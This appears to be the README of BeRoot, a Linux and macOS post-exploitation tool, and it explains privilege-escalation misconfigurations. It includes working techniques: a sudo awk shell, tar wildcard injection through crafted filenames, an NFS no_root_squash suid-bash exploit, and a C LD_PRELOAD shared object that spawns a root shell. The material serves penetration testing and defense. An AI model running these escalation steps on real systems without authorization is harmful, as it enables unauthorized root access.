# BeRoot For Linux

BeRoot is a post exploitation tool to check common misconfigurations on Linux and Mac OS to find a way to escalate our privilege. 

To understand privilege escalation on these systems, you should understand at least two main notions: GTFOBins and Wildcards. \
This Readme explains all technics implemented by BeRoot to better understand how to exploit it. 

GTFOBins
----

[GTFOBins](https://gtfobins.github.io/#) could be used to gain root privilege on a system. These binaries allow a user to execute arbitrary code on the host, so imagine you could have access to one of them with sudo privilege (suid binary or if it's allowed on the sudoers file), you should be able to execute system command as root. BeRoot contains a list of theses binaries taken from [GTFOBins](https://gtfobins.github.io/#).  

Here is an example of a well-known binary: 

* awk
```
sudo awk 'BEGIN {system("/bin/sh")}'
```

__Note__: If you have more binary example, do not hesitate to open an issue explaining the technic and I will add it on the list. 

Having sudo access on these binaries do not mean you could always manage to execute commands on the system. For example, using the __mount__ binary with a limited user could give you the following well known error, if it's well configured:  

```
mount: only root can use "--options" option
```

Wildcards
----

If you have never heard about Unix wildcards, I suggest you read this very well explained [article](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt).
Using wildcards could lead into code execution if this one is not well called. 

For our example, we want to get a shell ("sh") using the __tar__ command to execute code on the server. As explained on the GTFOBins section, we could get it doing: 
```
tar cf archive.tar * --checkpoint=1 --checkpoint-action=exec=sh
```
We consider a test file which is used to realize an archive of all files present on the directory. 
```
user@host:~$ cat test.sh 
tar cf archive.tar * 
```
Here are the steps to exploit this bad configuration: 
* open nano (with no arguments)
* write something in it
* save file using __tar__ arguments as file names: 
	* --checkpoint-action=exec=sh
	* --checkpoint=1

Once created, this is what you will find: 
```
user@host:~$ ls -la 
total 32
-rw-r--r-- 1 user user     5 Jan 12 10:34 --checkpoint-action=exec=sh
-rw-r--r-- 1 user user     3 Jan 12 10:33 --checkpoint=1
drwxr-xr-x 2 user user  4096 Jan 12 10:34 .
drwxr-xr-x 7 user user  4096 Jan 12 10:29 ..
-rwxr-xr-x 1 user user    22 Jan 12 10:32 test.sh
```
If this file is executed as root (from cron table, from sudoers, etc.), you should gain root access on the system. 

```
user@host:~$ sudo ./test.sh 
sh-4.3# id
uid=0(root) gid=0(root) groups=0(root)
```
So depending on which binary and how the wildcard are used, the exploitation can be done or not. So on our example, the exploitation would not work anymore if the file would be like this: 
```
user@host:~$ cat test.sh 
tar cf archive.tar *.txt
```
Thus, using a tool to detect these misconfigurations is very difficult. A manually analyse should be done to check if it's a false positive or not. 


Sensitive files 
----

Lots of file are run with high permissions on the system (e.g cron files, services, etc.). Here is an example of intersting directories and files:
```
/etc/init.d
/etc/cron.d 
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/at.allow
/etc/at.deny
/etc/crontab
/etc/cron.allow
/etc/cron.deny
/etc/anacrontab
/var/spool/cron/crontabs/root
```

Here are the tests done by BeRoot: 
* checks if you have access with write permission on these files. 
* checks inside the file, to find other paths with write permissions. 
* checks for wildcards (this check could raise false positives, but could also get you useful information). Sometimes, you may need write permissions on a specific folder to create your malicious file (as explained on the wildcard section), this check is not done because it could be done by two many ways on the script and it's difficult to automate.


Suid binaries
----

SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it. So if suid file is owned by root, you should execute it using root privilege. 

BeRoot prints all suid files because a manually analyse should be done on each binary. However, it realizes some actions: 
* checks if we have write permissions on these binary (why not ? :))
* checks if a GTFOBins is used as suid to be able to execute system commands using it (remember you could have suid GTFOBins without beeing able to exectute commands - checks GTFOBins section with the false positive example using __mount__). 

To analyse manually, checking for .so files loaded from a writable path should be a great idea (this check has not been implemented on BeRoot): 
```
strace [SUID_PATH] 2>&1 | grep -i -E "open|access|no such file"
```


NFS Root Squashing
----

If __no_root_squash__ appears in `/etc/exports`, privilege escalation may be done. More information can be found [here](https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/).

Exploitation:
```
mkdir /tmp/nfsdir  # create dir
mount -t nfs 192.168.1.10:/shared /tmp/nfsdir # mount directory 
cd /tmp/nfsdir
cp /bin/bash . 	# copy wanted shell 
chmod +s bash 	# set suid permission
```

LD_PRELOAD
----

If __LD_PRELOAD__ is explicitly defined on sudoers file, it could be used to elevate our privilege. \

For example: 
```
Defaults        env_keep += LD_PRELOAD
```

Create a share object:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

Compile it:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

If you have a binary that you could launch with sudo and NOPASSWD, launch it with LD_PRELOAD pointing to your shared object:
```
sudo LD_PRELOAD=/tmp/shell.so find
```

More information can be found [here](http://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/).

Sudoers file
----

Most of privilege escalations on Linux servers are done using bad sudo configurations. This configuration can be seen in __/etc/sudoers__ file. \
To better understand the BeRoot workflow, you should have an idea on how a sudoers line is composed.  

Basic line pattern: 
```
users  hosts = (run-as) tags: commands
```

Here is an example using aliases. 
```
User_Alias ADMINS = admin, user, root
Cmnd_Alias ADMIN_CMDS = /sbin/service, /usr/sbin/iptables, python /tmp/file.py
ADMINS ALL = (ALL) NOPASSWD: ADMIN_CMDS
```
So users "admin", "user" and "root" could execute "service", "iptables" and "file.py" without password needed (thanks to NOPASSWD): 
```
admin,user,root ALL = (ALL) NOPASSWD: /sbin/service, /usr/sbin/iptables, python /tmp/file.py
```

So BeRoot will analyse all rules: 
* if it affects our user or our user's group: 
	* check if we have write permissions on all possible commands (in our example, it will test "service", "iptables", "python" and "/tmp/files.py")
	* check for GTFOBins
	* check for GTFOBins + wildcards 
	* check if we can impersonate another user ("su" command)
		* check write permissions on sensitive files and suid bin for this user
		* realize again all these checks on the sudoers file using this new user

Sudo list
----

Sometimes you do not have access to /etc/sudoers. 
```
$ cat /etc/sudoers
cat: /etc/sudoers: Permission denied
```
However, listing sudo rules is possible using sudo -l
```
$ sudo -l  
Matching Defaults entries for test on XXXXX:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User test may run the following commands on XXXXX:
    (ALL) /bin/bash
```
Why is it possible ? On the [documentation](https://www.sudo.ws/man/1.8.17/sudoers.man.html) it's written: 
```By default, if the NOPASSWD tag is applied to any of the entries for a user on the current host, he or she will be able to run "sudo -l" without a password. [...] This behavior may be overridden via the verifypw and listpw options```

However, these rules only affect the current user, so if user impersonation is possible (using su) `sudo -l` should be launched from this user as well. \
BeRoot collects all these rules from all possible user an realize exaclty the same tests as listed perviously (e.g sudoers file method).

Exploit
----

Because lots of server are vulnerable to well known exploit (dirtycow, etc.), I have embeeded [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) to give an overview of potential CVE that affect the kernel (this module will only work for Linux systems). 


----
| __Alessandro ZANNI__    |
| ------------- |
| __zanni.alessandro@gmail.com__  |
